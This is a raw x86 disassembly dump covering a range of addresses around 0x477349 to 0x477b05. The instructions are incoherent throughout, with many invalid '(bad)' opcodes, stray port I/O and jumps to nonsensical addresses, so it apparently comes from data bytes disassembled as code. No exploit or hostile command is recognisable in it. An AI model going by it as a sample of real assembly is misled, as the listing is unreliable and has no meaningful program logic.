  477349:	xchg   BYTE PTR [ebx],cl
  47734b:	inc    edi
  47734c:	dec    ecx
  47734d:	lods   al,BYTE PTR ds:[esi]
  47734e:	add    BYTE PTR [eax+0x6249b8d0],0x7
  477355:	jbe    0x4773ce
  477357:	aaa    
  477358:	jl     0x4773a0
  47735a:	add    DWORD PTR [ebx+eiz*1],esp
  47735d:	pop    ds
  47735e:	adc    ecx,DWORD PTR ds:0x30146795
  477364:	and    DWORD PTR [edi-0x44],ebx
  477367:	lahf   
  477368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  477369:	popf   
  47736a:	nop
  47736b:	push   edi
  47736c:	cwde   
  47736d:	pop    edx
  47736e:	push   es
  47736f:	int3   
  477370:	rcl    ah,1
  477372:	pop    edx
  477373:	sbb    DWORD PTR [esi],edi
  477375:	in     eax,dx
  477376:	or     al,0x5f
  477378:	dec    eax
  477379:	pop    esp
  47737a:	push   es
  47737b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47737c:	js     0x4773db
  47737e:	pop    edi
  47737f:	inc    esi
  477380:	ss fwait
  477382:	int    0xb4
  477384:	pop    ebp
  477385:	xor    al,0x5e
  477387:	sbb    BYTE PTR [eax+0x28],bl
  47738a:	pop    eax
  47738b:	les    esp,FWORD PTR [esi]
  47738d:	cmp    ebx,eax
  47738f:	sti    
  477390:	push   cs
  477391:	add    al,0x59
  477393:	mov    ds,WORD PTR [ecx+0x5f]
  477396:	xor    BYTE PTR [ebx+0x6c],bl
  477399:	ficomp WORD PTR [ebx+0x7c16f862]
  47739f:	pop    ebx
  4773a0:	pop    edi
  4773a1:	mov    WORD PTR [esi-0x58],?
  4773a4:	push   es
  4773a5:	ror    BYTE PTR [edx],1
  4773a7:	ret    
  4773a8:	mov    ebp,0xe61846f7
  4773ad:	in     al,dx
  4773ae:	mov    esi,0xe0506fc
  4773b3:	xor    DWORD PTR ds:0x7bf9ff0,0x44eb0121
  4773bd:	cmc    
  4773be:	add    BYTE PTR [eax-0x6bf0a8ac],bh
  4773c4:	and    ecx,DWORD PTR [eax-0x40]
  4773c7:	jne    0x47736b
  4773c9:	out    dx,eax
  4773ca:	mov    al,0x23
  4773cc:	inc    edi
  4773cd:	je     0x47744b
  4773cf:	pop    es
  4773d0:	pop    ss
  4773d1:	es test dh,al
  4773d4:	rol    BYTE PTR [esi],1
  4773d6:	call   0xe2c69339
  4773db:	loopne 0x4773bf
  4773dd:	mov    BYTE PTR [edi-0x5e],bl
  4773e0:	pusha  
  4773e1:	push   ss
  4773e2:	push   esp
  4773e3:	pop    DWORD PTR [esp]
  4773e6:	repz pop esi
  4773e8:	mov    ds:0x83ec712,al
  4773ed:	out    dx,al
  4773ee:	dec    eax
  4773ef:	repz mov ah,0x3
  4773f2:	mov    al,0xdf
  4773f4:	enter  0x662,0xdc
  4773f8:	jl     0x4773a0
  4773fa:	icebp  
  4773fb:	jmp    0x4773cb
  4773fd:	mov    edi,ds
  4773ff:	pushf  
  477400:	push   cs
  477401:	or     eax,0x126a4854
  477406:	mov    esp,DWORD PTR [ecx+0x62]
  477409:	jnp    0x477409
  47740b:	and    bh,BYTE PTR [ecx]
  47740d:	mov    ecx,0xb898ef68
  477412:	or     al,0xc3
  477414:	and    cl,bh
  477416:	pushf  
  477417:	fs inc ecx
  477419:	in     al,0x9a
  47741b:	pop    ss
  47741c:	add    eax,0xd7f067c7
  477421:	or     al,0x25
  477423:	adc    bl,cl
  477425:	add    esi,DWORD PTR [ecx]
  477427:	dec    esp
  477428:	mov    bh,0xd8
  47742a:	fs inc ecx
  47742c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47742d:	test   dl,dl
  47742f:	enter  0x6510,0x13
  477433:	mov    ebp,0xece4899
  477438:	stos   DWORD PTR es:[edi],eax
  477439:	imul   DWORD PTR [ebp+eiz*1-0x74]
  47743d:	retf   
  47743e:	adc    ecx,ecx
  477440:	out    0x14,eax
  477442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477443:	and    al,0x34
  477445:	gs inc ecx
  477447:	xchg   DWORD PTR [edi+0x65d8c93c],eax
  47744d:	pushf  
  47744e:	inc    cx
  477450:	add    al,0x66
  477452:	xlat   BYTE PTR ds:[ebx]
  477453:	mov    cl,0x1f
  477455:	xchg   DWORD PTR ds:0x56ccd6f3,esi
  47745b:	ret    0xf8f7
  47745e:	sub    ch,BYTE PTR [ecx+0x5e]
  477461:	add    al,0x26
  477463:	sbb    BYTE PTR [eax],ah
  477465:	push   0xf69c2e41
  47746a:	sub    bh,ch
  47746c:	pop    eax
  47746d:	push   0xb5540ff7
  477472:	jbe    0x477446
  477474:	add    ebx,ecx
  477476:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  477478:	in     al,dx
  477479:	or     BYTE PTR [ebx],bl
  47747b:	push   cs
  47747c:	in     al,0x40
  47747e:	push   cs
  47747f:	or     al,0x10
  477481:	adc    al,0x40
  477483:	push   cs
  477484:	in     al,0x40
  477486:	sbb    BYTE PTR [esp+eiz*8],bl
  477489:	inc    eax
  47748a:	push   cs
  47748b:	in     al,0x20
  47748d:	and    al,0x28
  47748f:	mov    al,ds:0x51058996
  477494:	add    al,0x8c
  477496:	or     al,0x32
  477498:	or     al,0xd1
  47749a:	in     al,dx
  47749b:	in     al,dx
  47749c:	scas   al,BYTE PTR es:[edi]
  47749d:	jns    0x47743d
  47749f:	out    0x3d,eax
  4774a1:	and    bh,BYTE PTR [eax-0x5f6c3dfa]
  4774a7:	adc    eax,0xe79e79e7
  4774ac:	and    esi,DWORD PTR [ecx]
  4774ae:	aas    
  4774af:	dec    ebp
  4774b0:	pop    ebx
  4774b1:	enter  0x7c27,0x9e
  4774b5:	imul   esi,DWORD PTR [edi-0x7b],0x1d0c2926
  4774bc:	push   0xffffffe9
  4774be:	dec    ebp
  4774bf:	into   
  4774c0:	cs adc al,0x37
  4774c3:	je     0x4774ec
  4774c5:	cmp    DWORD PTR [ecx+esi*2+0x26],eax
  4774c9:	ss push es
  4774cb:	pop    ss
  4774cc:	mov    al,ds:0x90aa7727
  4774d1:	les    eax,FWORD PTR [edi-0x60b15820]
  4774d7:	out    0xf3,al
  4774d9:	mov    ah,0xa8
  4774db:	push   es
  4774dc:	sub    al,0x6c
  4774df:	test   eax,0x9aabd8d0
  4774e4:	iret   
  4774e5:	repz xor al,0xe4
  4774e8:	lock cld 
  4774ea:	or     BYTE PTR [esp+eax*4+0x7aac227a],ch
  4774f1:	push   cs
  4774f2:	fbld   TBYTE PTR [ebx+0x5527fc90]
  4774f8:	push   edi
  4774f9:	xchg   edi,eax
  4774fa:	sub    BYTE PTR [edi],bl
  4774fc:	aas    
  4774fd:	or     bh,cl
  4774ff:	xor    bl,BYTE PTR ds:0x3758e2e0
  477505:	not    BYTE PTR [ebx+eax*4-0x30]
  477509:	out    0x44,al
  47750b:	jnp    0x47755c
  47750d:	mov    eax,0xb728268d
  477512:	push   0xaf4d9628
  477517:	xchg   edx,eax
  477518:	sub    BYTE PTR [eax+0x68e0b668],bh
  47751e:	imul   eax,DWORD PTR ds:0x607c757,0xffffff9f
  477525:	jle    0x4774e3
  477527:	(bad)  
  477528:	in     eax,dx
  477529:	mov    esp,0xdfe4b577
  47752e:	mul    BYTE PTR [esi]
  477530:	jl     0x477540
  477532:	or     al,0xc7
  477534:	jge    0x477510
  477536:	xchg   ecx,eax
  477537:	add    esp,DWORD PTR [edi+ebp*2+0x38067004]
  47753e:	dec    eax
  47753f:	jae    0x4774e8
  477541:	jge    0x4775aa
  477543:	mov    bl,0x16
  477545:	sub    BYTE PTR [ecx+0x68],dh
  477548:	xchg   edx,eax
  477549:	push   cs
  47754a:	cmp    BYTE PTR [ebx-0x3b3ddffa],dl
  477550:	add    bl,ah
  477552:	test   BYTE PTR [eax+0x5470b741],al
  477558:	popa   
  477559:	jo     0x47758f
  47755b:	jmp    0x1129:0xfee861e2
  477562:	enter  0x6683,0x97
  477566:	dec    esp
  477567:	sub    DWORD PTR [ebx-0xf],eax
  47756a:	push   ds
  47756b:	jecxz  0x477574
  47756d:	inc    ebp
  47756e:	addps  xmm4,XMMWORD PTR [esi+0xa]
  477572:	jo     0x477556
  477574:	mov    cl,0x8d
  477576:	jo     0x477599
  477578:	shr    BYTE PTR [ecx+ebp*1+0x65],1
  47757c:	dec    edx
  47757d:	cdq    
  47757e:	sbb    bh,BYTE PTR [edi]
  477580:	inc    esp
  477581:	sar    BYTE PTR [esi+0x21bffff0],1
  477587:	push   cs
  477588:	mov    edi,0x71e8073f
  47758d:	mov    ecx,0x11d1e3a6
  477592:	stos   BYTE PTR es:[edi],al
  477593:	mov    cl,0x0
  477595:	ror    BYTE PTR [edi-0x4f],0x54
  477599:	xchg   ebx,eax
  47759a:	sbb    al,cl
  47759c:	outs   dx,DWORD PTR ds:[esi]
  47759d:	mov    esp,0xa40dd86e
  4775a2:	ror    DWORD PTR [edx-0x76],cl
  4775a5:	xchg   esp,eax
  4775a6:	lods   al,BYTE PTR ds:[esi]
  4775a7:	inc    edi
  4775a8:	fmul   DWORD PTR [esi]
  4775aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4775ab:	cmp    esi,esi
  4775ad:	das    
  4775ae:	ins    BYTE PTR es:[edi],dx
  4775af:	adc    ecx,DWORD PTR [ebx+eax*2-0x7c432b2c]
  4775b6:	xchg   edi,eax
  4775b7:	inc    ebx
  4775b8:	aam    0xcc
  4775ba:	test   eax,0xc106b70a
  4775bf:	icebp  
  4775c0:	cmp    al,0xcf
  4775c2:	repz mov eax,ds:0x2e3d9cb
  4775c8:	pop    ss
  4775c9:	stc    
  4775ca:	(bad)  
  4775cb:	jg     0x4775af
  4775cd:	pop    eax
  4775ce:	sbb    BYTE PTR [ebx+0x59ec86e2],cl
  4775d4:	inc    ebp
  4775d5:	(bad)  
  4775d6:	int    0x6b
  4775d8:	dec    edi
  4775d9:	add    BYTE PTR [ecx+0x51],0xed
  4775dd:	out    dx,al
  4775de:	sub    DWORD PTR [ecx],eax
  4775e0:	xchg   DWORD PTR [edi+ebp*1],esi
  4775e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4775e4:	aas    
  4775e5:	(bad)  
  4775e6:	sub    DWORD PTR [esp+edx*4],ebp
  4775e9:	clc    
  4775ea:	lods   al,BYTE PTR ds:[esi]
  4775eb:	jno    0x477570
  4775ed:	sub    ah,dh
  4775ef:	push   es
  4775f0:	ja     0x477600
  4775f2:	dec    eax
  4775f3:	sub    ebx,DWORD PTR [ecx]
  4775f5:	icebp  
  4775f6:	mov    esp,0x1ed6af69
  4775fb:	cmp    BYTE PTR [eax],dh
  4775fd:	(bad)  
  4775fe:	sbb    al,0x3a
  477600:	jno    0x4775e7
  477602:	adc    BYTE PTR [ecx+eax*2+0x67419d54],ah
  477609:	fcomp  QWORD PTR [edi+ebx*4+0x8bcbbe6]
  477610:	mov    al,ds:0x9fac0ee0
  477615:	lock call 0xc17c6dbc
  47761b:	imul   esi,DWORD PTR [esi+0x28],0x30f81e74
  477622:	push   ss
  477623:	push   0x90c503a2
  477628:	pushf  
  477629:	mov    edi,0x10fb2954
  47762e:	call   DWORD PTR [eax]
  477630:	rol    BYTE PTR [edx+0xc],0xfc
  477634:	(bad)  
  477635:	jle    0x477631
  477637:	(bad)  
  477638:	stc    
  477639:	(bad)  
  47763a:	clc    
  47763b:	(bad)  
  47763c:	fidiv  WORD PTR [edi]
  47763e:	jecxz  0x47763f
  477640:	idiv   edi
  477642:	idiv   bh
  477644:	cmc    
  477645:	push   esp
  477647:	push   ebx
  477649:	push   edx
  47764b:	loop   0x47763e
  47764d:	push   eax
  47764f:	call   DWORD PTR [esi+edi*2-0x30c30c64]
  477656:	repz push es
  477658:	mov    al,ds:0xc4bcecb8
  47765d:	repz imul edi,DWORD PTR [esi],0x80d4c8cf
  477664:	mov    eax,ds:0x8aa3c094
  477669:	addr16 jo 0x47762a
  47766c:	fisub  WORD PTR [eax+eiz*4-0x42f5e1f1]
  477673:	cmp    BYTE PTR [ebp+esi*1+0x7d79098],ch
  47767a:	and    DWORD PTR [esi],edx
  47767c:	adc    BYTE PTR [esp+ebx*1-0x72],0xba
  477681:	mov    ds:0x76cc3397,al
  477686:	jmp    0xfe8e7676
  47768b:	dec    ebp
  47768c:	pop    es
  47768d:	add    al,0xb4
  47768f:	out    dx,al
  477690:	mov    ?,WORD PTR [edx+0x3d]
  477693:	cmp    al,0x30
  477695:	or     al,0x3c
  477697:	pop    es
  477698:	add    DWORD PTR ds:0x83f57922,edi
  47769e:	test   al,0x3
  4776a0:	push   esp
  4776a1:	popa   
  4776a2:	addr16 ss hlt 
  4776a5:	sub    ecx,DWORD PTR [edi]
  4776a7:	push   edi
  4776a8:	dec    ecx
  4776a9:	jae    0x4776bf
  4776ab:	sub    al,0x14
  4776ad:	cld    
  4776ae:	data16 clc 
  4776b0:	cmp    eax,0x67cd3cf
  4776b5:	xor    BYTE PTR [ebp-0x4b6b9b70],ah
  4776bb:	hlt    
  4776bc:	sbb    BYTE PTR [edi-0x63b7d919],0x10
  4776c3:	push   esp
  4776c4:	inc    edx
  4776c5:	push   0x69
  4776c7:	arpl   WORD PTR [ecx+0x63],ax
  4776ca:	or     ecx,edi
  4776cc:	mov    edx,0x3a4c1c3e
  4776d1:	imul   edi,esi,0x74
  4776d4:	sub    al,0xe2
  4776d6:	popf   
  4776d7:	xchg   BYTE PTR [eax+ebx*8+0x62c6e1f],dh
  4776de:	push   esp
  4776df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4776e0:	in     al,0x44
  4776e2:	repnz mov esi,0xa5ec2a48
  4776e8:	dec    esp
  4776e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4776ea:	sahf   
  4776eb:	test   BYTE PTR [ebp+0x21],0xa8
  4776ef:	pop    esi
  4776f0:	or     al,0xa7
  4776f2:	inc    esi
  4776f3:	mov    al,0x44
  4776f5:	sahf   
  4776f6:	jg     0x477696
  4776f8:	test   DWORD PTR [esi],0x94480e74
  4776fe:	add    DWORD PTR [eax],eax
  477700:	out    dx,eax
  477701:	(bad)  
  477702:	js     0x477710
  477704:	fdiv   DWORD PTR [ebx+0x10]
  477707:	or     BYTE PTR [edi+0x56],bl
  47770a:	fadd   DWORD PTR [edi]
  47770c:	sub    DWORD PTR [eax],ebp
  47770e:	push   eax
  47770f:	ins    BYTE PTR es:[edi],dx
  477710:	xor    BYTE PTR [ebx+0x44],bh
  477713:	sub    esp,DWORD PTR [ebx]
  477715:	jno    0x4776c8
  477717:	test   eax,0x2d0067da
  47771c:	dec    esi
  47771d:	push   cs
  47771e:	dec    ecx
  47771f:	fs dec bp
  477722:	retf   0x66c0
  477725:	test   BYTE PTR [eax],ch
  477727:	or     dh,BYTE PTR [edx+0x79]
  47772a:	add    BYTE PTR [esi],dh
  47772c:	add    esp,DWORD PTR [ecx+0x1276ad2f]
  477732:	xor    al,0x54
  477734:	sub    eax,0x66515552
  477739:	xchg   edx,eax
  47773a:	rcr    esp,1
  47773c:	add    dl,ah
  47773e:	push   es
  47773f:	push   esp
  477740:	(bad)  
  477741:	test   BYTE PTR ds:0x5567e965,0x24
  477748:	into   
  477749:	mov    ah,0x95
  47774b:	lds    esp,FWORD PTR [ebp-0x44]
  47774e:	js     0x477718
  477750:	inc    esp
  477751:	jnp    0x47771a
  477753:	dec    edi
  477754:	loopne 0x4776d9
  477756:	cmp    BYTE PTR [esi-0x26],dh
  477759:	jo     0x4777ac
  47775b:	clc    
  47775c:	sar    bh,0x74
  47775f:	leave  
  477760:	(bad)  
  477761:	pushf  
  477762:	add    al,0x5
  477764:	push   es
  477765:	clc    
  477766:	sub    eax,0x139009c0
  47776b:	clc    
  47776c:	sub    eax,0x7e242fb4
  477771:	add    edx,DWORD PTR [esi+esi*1]
  477774:	add    ah,BYTE PTR [edi+0x47]
  477777:	jb     0x4777e8
  477779:	jne    0x4777eb
  47777b:	aad    0xba
  47777d:	inc    esp
  47777e:	stos   DWORD PTR es:[edi],eax
  47777f:	sahf   
  477780:	cs scas eax,DWORD PTR es:[edi]
  477782:	aas    
  477783:	and    al,0xaf
  477785:	inc    edx
  477786:	cmp    ah,BYTE PTR [ecx+edi*2+0x730a32dc]
  47778d:	xchg   edx,eax
  47778e:	rol    DWORD PTR [edx+0x14],0x36
  477792:	or     al,0x84
  477794:	xor    BYTE PTR [edi+esi*2],bl
  477797:	ja     0x4777d1
  477799:	repnz push edx
  47779b:	mov    edi,0x6aed33f8
  4777a0:	cmp    al,0xdd
  4777a2:	dec    esp
  4777a3:	mov    cl,0xf0
  4777a5:	mov    esi,DWORD PTR [eax+0x8]
  4777a8:	dec    esi
  4777a9:	nop
  4777aa:	cmp    BYTE PTR [ecx],ah
  4777ac:	xlat   BYTE PTR ds:[ebx]
  4777ad:	arpl   WORD PTR [eax+0x48],cx
  4777b0:	loopne 0x477814
  4777b2:	xor    DWORD PTR [eiz*2-0x5beec170],ecx
  4777b9:	xchg   DWORD PTR [ebx+edx*1-0x7b],esi
  4777bd:	in     eax,dx
  4777be:	inc    edx
  4777bf:	ret    
  4777c0:	jnp    0x4777ea
  4777c2:	out    dx,al
  4777c3:	aad    0x49
  4777c5:	and    edx,ebp
  4777c7:	jmp    0x477779
  4777c9:	sbb    al,al
  4777cb:	lds    esp,FWORD PTR [eax-0x35]
  4777ce:	mov    eax,ebp
  4777d0:	mov    bh,0x93
  4777d2:	jo     0x4777f4
  4777d4:	xchg   BYTE PTR [edi+0x120a085d],bl
  4777da:	cmp    BYTE PTR [ecx],ah
  4777dc:	add    DWORD PTR [ecx-0x6020e1ff],ebp
  4777e2:	ss push esi
  4777e4:	push   es
  4777e5:	jmp    0x4777e9
  4777e7:	inc    ebx
  4777e8:	je     0x4777f8
  4777ea:	sub    BYTE PTR [ebp-0x4],al
  4777ed:	pusha  
  4777ee:	imul   edi,DWORD PTR [ebx+0x66],0xfadbd82b
  4777f5:	jne    0x477804
  4777f7:	xchg   BYTE PTR [esi],dh
  4777f9:	test   ebp,0xeb3221e7
  4777ff:	sbb    al,0x19
  477801:	outs   dx,BYTE PTR ds:[esi]
  477802:	jmp    0x477818
  477804:	xchg   ebx,eax
  477805:	mov    dh,ch
  477807:	and    eax,0x321dbbb
  47780c:	out    0x1f,eax
  47780e:	les    eax,FWORD PTR [esi]
  477810:	push   esi
  477811:	fyl2xp1 
  477813:	mov    BYTE PTR [ebp-0x60],dl
  477816:	adc    al,0x8
  477818:	mov    al,0xff
  47781a:	stos   BYTE PTR es:[edi],al
  47781b:	inc    bl
  47781d:	jl     0x477866
  47781f:	adc    BYTE PTR cs:[edx+0x43411e14],ah
  477826:	add    al,0x1c
  477828:	xor    BYTE PTR [edx],ah
  47782a:	sbb    DWORD PTR [eax+0x60],edx
  47782d:	xchg   DWORD PTR [eax],ecx
  47782f:	cmp    ebp,esp
  477831:	jo     0x477857
  477833:	loop   0x477805
  477835:	or     al,0x87
  477837:	pop    esp
  477838:	jl     0x477862
  47783a:	adc    al,dh
  47783c:	push   ss
  47783d:	clc    
  47783e:	stc    
  47783f:	and    al,0x2
  477841:	add    edi,ebp
  477843:	ret    
  477844:	std    
  477845:	jmp    DWORD PTR [esi-0xefbf7e5]
  47784b:	add    al,0xf
  47784d:	xor    BYTE PTR [edx-0x7f],dl
  477850:	adc    BYTE PTR [ebx-0x7312f3f8],0x4
  477857:	sub    al,0x22
  477859:	dec    edi
  47785a:	push   edx
  47785b:	call   0x504:0x262d1a2b
  477862:	and    ebx,ebx
  477864:	sar    DWORD PTR [eax+0x67],0xe8
  477868:	sbb    edx,ebx
  47786a:	(bad)  
  47786b:	clc    
  47786c:	mov    edi,DWORD PTR [edi+eax*8]
  47786f:	enter  0x6925,0xb3
  477873:	xor    ah,BYTE PTR ds:0x4a432594
  477879:	es hlt 
  47787b:	and    al,0xdd
  47787d:	push   edx
  47787e:	sub    dh,bh
  477880:	push   esp
  477881:	cmp    eax,0xe135d758
  477886:	push   cs
  477887:	and    ebx,edx
  477889:	pop    ds
  47788a:	sbb    BYTE PTR [esp+edx*4-0x1],bl
  47788e:	and    edx,DWORD PTR [ebx]
  477890:	outs   dx,DWORD PTR ds:[esi]
  477891:	test   DWORD PTR [esi+0x17],ebx
  477894:	mov    edi,0x8560b400
  477899:	test   dh,al
  47789b:	dec    eax
  47789c:	mov    eax,DWORD PTR [edi+0x72]
  47789f:	pop    eax
  4778a0:	or     ah,cl
  4778a2:	fidivr WORD PTR [ecx+0x10]
  4778a5:	xchg   esp,eax
  4778a6:	push   ds
  4778a7:	sbb    dl,dh
  4778a9:	(bad)
  4778ac:	pop    ss
  4778ad:	inc    edx
  4778ae:	push   edx
  4778af:	js     0x4778f6
  4778b1:	or     BYTE PTR [ebp-0x67f94133],al
  4778b7:	in     eax,0x58
  4778b9:	add    BYTE PTR [edx-0x6f6e78fa],cl
  4778bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4778c0:	xchg   edi,eax
  4778c1:	div    esp
  4778c3:	mov    bl,0x48
  4778c5:	and    eax,0x31333931
  4778ca:	arpl   WORD PTR [edx],dx
  4778cc:	dec    ebx
  4778cd:	in     eax,0x80
  4778cf:	retf   0xfcfc
  4778d2:	sub    DWORD PTR [edi],0x10d7f0b
  4778d8:	pop    ds
  4778d9:	bound  esi,QWORD PTR [eax]
  4778db:	sub    ecx,DWORD PTR [edx]
  4778dd:	popf   
  4778de:	xchg   edi,eax
  4778df:	jae    0x477876
  4778e1:	(bad)  
  4778e2:	lods   eax,DWORD PTR ds:[esi]
  4778e3:	in     eax,0xb5
  4778e5:	sub    DWORD PTR [edi+0xb],0x5e50198d
  4778ec:	dec    esp
  4778ed:	jb     0x477917
  4778ef:	dec    ebp
  4778f0:	sub    al,0x0
  4778f2:	push   eax
  4778f3:	ror    DWORD PTR [ebx],1
  4778f5:	pop    ss
  4778f6:	mov    dl,ch
  4778f8:	sbb    BYTE PTR [edx+0x13],bl
  4778fb:	nop
  4778fc:	inc    eax
  4778fd:	push   ds
  4778fe:	cs jno 0x47793b
  477901:	xor    DWORD PTR [ecx+0x48],eax
  477904:	fild   QWORD PTR ds:0x31652737
  47790a:	loopne 0x47791b
  47790c:	popf   
  47790d:	mov    ds:0x174a4580,eax
  477912:	cmp    al,0x20
  477914:	xor    eax,0x4383f881
  477919:	inc    ebx
  47791a:	mov    esp,0x3cfbd83b
  47791f:	or     al,0x15
  477921:	test   DWORD PTR [edi-0x13e1c4ba],ecx
  477927:	lock dec eax
  477929:	xchg   edx,eax
  47792a:	and    eax,0xb0371a98
  47792f:	sub    ecx,DWORD PTR [edx+0x3f]
  477932:	adc    DWORD PTR [ecx],esp
  477934:	fimul  DWORD PTR [edx]
  477936:	sub    DWORD PTR [eax+0x5a],eax
  477939:	inc    edi
  47793a:	loop   0x47796c
  47793c:	push   0x460dbad
  477941:	cmp    BYTE PTR [eax+0x404e401],dl
  477947:	or     BYTE PTR [ebx+ebp*1+0x3a],cl
  47794b:	sbb    DWORD PTR [eax-0x62],ebp
  47794e:	fsubr  DWORD PTR [ecx+0x8]
  477951:	nop
  477952:	jge    0x4778df
  477954:	pop    ebp
  477955:	imul   ebp,DWORD PTR [ecx+0x29],0x48
  477959:	imul   ebx,eax,0x57a163b1
  47795f:	dec    edi
  477960:	sbb    al,BYTE PTR [edi+0x20]
  477963:	xchg   BYTE PTR [eax+0x74481336],al
  477969:	xor    DWORD PTR [edi+ebp*2+0x75],ebp
  47796d:	cmp    ah,cl
  47796f:	adc    al,0x1a
  477971:	imul   esp,DWORD PTR [eax],0x46
  477974:	xchg   edx,eax
  477975:	sbb    dl,ch
  477977:	clc    
  477978:	sbb    eax,0x586b542e
  47797d:	icebp  
  47797e:	and    BYTE PTR [eax-0x78],dl
  477981:	inc    ebx
  477982:	adc    BYTE PTR [ebp+0x35],al
  477985:	mov    BYTE PTR [edx],dh
  477987:	cwde   
  477988:	xor    ah,BYTE PTR [edi-0x7f68ecb1]
  47798e:	push   ecx
  47798f:	clc    
  477990:	push   eax
  477991:	mov    DWORD PTR ds:0x9a252d88,0xce35478d
  47799b:	test   DWORD PTR [edx+0x5a3ec8e2],0xfe2dac3a
  4779a5:	loop   0x4779c4
  4779a7:	cs pushf 
  4779a9:	xor    al,0x60
  4779ab:	fcmovbe st,st(6)
  4779ad:	cmp    esi,eax
  4779af:	inc    esi
  4779b0:	adc    BYTE PTR [ecx],al
  4779b2:	mov    edx,DWORD PTR [edx+0x44]
  4779b5:	adc    BYTE PTR ds:0x7bf0efcf,ah
  4779bb:	dec    esp
  4779bc:	push   ebx
  4779bd:	lea    eax,[esi-0x55]
  4779c0:	push   esp
  4779c1:	add    BYTE PTR [ebx-0x7ab2f798],0xff
  4779c8:	mov    ah,0xeb
  4779ca:	cld    
  4779cb:	in     eax,dx
  4779cc:	jl     0x4779e4
  4779ce:	inc    ebp
  4779cf:	xor    edi,edi
  4779d1:	out    0x57,eax
  4779d3:	inc    edi
  4779d4:	dec    ebp
  4779d5:	jne    0x4779c4
  4779d7:	xor    eax,0x8f4c69ad
  4779dc:	mov    bh,0x87
  4779de:	imul   esi,esp,0x87c7a2b4
  4779e4:	test   al,0x41
  4779e6:	sahf   
  4779e7:	sub    ecx,edx
  4779e9:	outs   dx,BYTE PTR ds:[esi]
  4779ea:	lds    edx,FWORD PTR [eax-0x5e]
  4779ed:	inc    ebp
  4779ee:	and    DWORD PTR [eax],edi
  4779f0:	or     BYTE PTR [edi],cl
  4779f2:	sbb    dl,BYTE PTR [edx+0xa]
  4779f5:	jg     0x477a5d
  4779f7:	add    al,BYTE PTR [ebp-0x33]
  4779fa:	push   ds
  4779fb:	les    eax,FWORD PTR [edi-0x2e]
  4779fe:	fsubp  st(1),st
  477a00:	jmp    0x88225e12
  477a05:	jmp    DWORD PTR [ebx-0x61dd09b9]
  477a0b:	dec    ebp
  477a0c:	cmp    BYTE PTR [eax+0x10],0xe8
  477a10:	dec    eax
  477a11:	popf   
  477a12:	mov    edx,0x64424215
  477a17:	cmp    al,BYTE PTR [esi+eax*2]
  477a1a:	xchg   edi,eax
  477a1c:	inc    esp
  477a1d:	mov    ?,WORD PTR [ecx]
  477a1f:	inc    ebp
  477a20:	dec    edi
  477a21:	mov    dh,0xc9
  477a23:	(bad)  
  477a24:	cdq    
  477a25:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  477a27:	dec    ecx
  477a28:	inc    ebx
  477a29:	xor    al,0xf8
  477a2b:	test   eax,0x2bdf4ca7
  477a30:	push   ecx
  477a31:	pop    es
  477a32:	mov    ah,0x27
  477a34:	dec    ecx
  477a35:	pop    ds
  477a36:	scas   eax,DWORD PTR es:[edi]
  477a37:	add    al,0x21
  477a39:	inc    esi
  477a3a:	hlt    
  477a3b:	mov    ecx,0x600d9f20
  477a40:	sub    BYTE PTR [ebx+0x1f],dh
  477a43:	outs   dx,BYTE PTR ds:[esi]
  477a44:	sub    ah,BYTE PTR [edx+0x4a892d36]
  477a4a:	mov    edx,0x9e3020d0
  477a4f:	xchg   DWORD PTR [ecx+0x55302e12],ecx
  477a55:	(bad)  
  477a56:	call   0x1383986e
  477a5b:	out    0xe0,eax
  477a5d:	shr    ch,1
  477a5f:	jl     0x477a84
  477a61:	xor    al,0xbe
  477a63:	and    ah,BYTE PTR [ecx+0x754cc4a4]
  477a69:	pop    es
  477a6a:	push   ebp
  477a6b:	sbb    DWORD PTR [ecx+0x49],0xffffffe8
  477a6f:	sbb    eax,0x3324f9bc
  477a74:	or     DWORD PTR [edi],0x4458ae30
  477a7a:	inc    esi
  477a7b:	inc    eax
  477a7c:	or     BYTE PTR [ebx+0x24117688],dh
  477a82:	jl     0x477afe
  477a84:	inc    eax
  477a85:	push   edx
  477a86:	call   0xe05ee6f6
  477a8b:	sub    eax,0x31ec5531
  477a90:	cmp    eax,DWORD PTR [eax+0x70055274]
  477a96:	aaa    
  477a97:	jns    0x477aa4
  477a99:	or     eax,DWORD PTR [esi+0x17]
  477a9c:	imul   esi,DWORD PTR [esi-0xf23f5c6],0xffffffa0
  477aa3:	imul   esp,DWORD PTR [esi],0x2a
  477aa6:	icebp  
  477aa7:	out    dx,al
  477aa8:	dec    esi
  477aa9:	(bad)  
  477aab:	cmp    esi,DWORD PTR [ebp+0x17]
  477aae:	push   ecx
  477aaf:	xor    ch,al
  477ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477ab2:	loop   0x477a8f
  477ab4:	inc    edi
  477ab5:	cmp    ecx,DWORD PTR [edi-0x2500451d]
  477abb:	dec    DWORD PTR [ebp-0x18]
  477abe:	jne    0x477a51
  477ac0:	dec    ebx
  477ac1:	retf   0x42f1
  477ac4:	xchg   DWORD PTR [ebx-0x1eb7a240],eax
  477aca:	jge    0x477b24
  477acc:	das    
  477acd:	jle    0x477aa2
  477acf:	pop    DWORD PTR [ebp+0x2a]
  477ad2:	shr    bh,0x70
  477ad5:	adc    eax,0x81cf9420
  477ada:	aas    
  477adb:	add    eax,0x471c0ca9
  477ae0:	aaa    
  477ae1:	and    DWORD PTR [eax*2-0x34ff46fd],edi
  477ae8:	out    0x47,eax
  477aea:	inc    edx
  477aeb:	inc    edx
  477aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  477aed:	mov    ecx,0x981f7d85
  477af2:	jle    0x477ae3
  477af4:	push   0x26
  477af6:	aad    0xb3
  477af8:	jge    0x477b16
  477afa:	and    ah,0x8b
  477afd:	int    0x23
  477aff:	or     dh,bl
  477b01:	sar    DWORD PTR [ecx],0xd0
  477b04:	(bad)  
  477b05:	mov    ds:0x5b58746f,eax
